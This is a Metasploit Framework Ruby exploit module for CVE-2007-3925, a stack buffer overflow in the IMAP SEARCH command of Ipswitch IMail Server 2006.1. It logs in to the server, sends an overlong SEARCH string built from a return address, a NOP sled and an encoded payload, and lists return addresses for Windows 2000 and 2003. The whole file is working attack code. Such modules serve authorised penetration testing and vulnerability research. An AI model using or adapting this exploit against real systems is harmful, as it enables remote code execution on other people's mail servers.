##
# $Id: ipswitch_search.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Imap

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Ipswitch IMail IMAP SEARCH Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Ipswitch IMail Server 2006.1 IMAP SEARCH
				verb. By sending an overly long string, an attacker can overwrite the
				buffer and control program execution.
				In order for this module to be successful, the IMAP user must have at least one
				message.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2007-3925' ],
					[ 'OSVDB', '36219' ],
					[ 'BID', '24962' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00\x0a\x0d\x20\x0b\x09\x0c",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Pro SP4 English',   { 'Ret' => 0x77f81be3 } ],
					[ 'Windows 2003 SP0 English',       { 'Ret' => 0x77c5cee8 } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 18 2007'))
	end

	def exploit

		sploit =  "a002 SEARCH BEFORE " + "<" + rand_text_english(87)
		sploit << [target.ret].pack('V') + make_nops(20) + payload.encoded + ">"

		info = connect_login

		if (info == true)
			print_status("Trying target #{target.name}...")
			sock.put("a001 SELECT INBOX\r\n")
			sock.get_once(-1, 3)
			sock.put(sploit + "\r\n")
		else
			print_status("Not falling through with exploit")
		end

		handler
		disconnect

	end
end
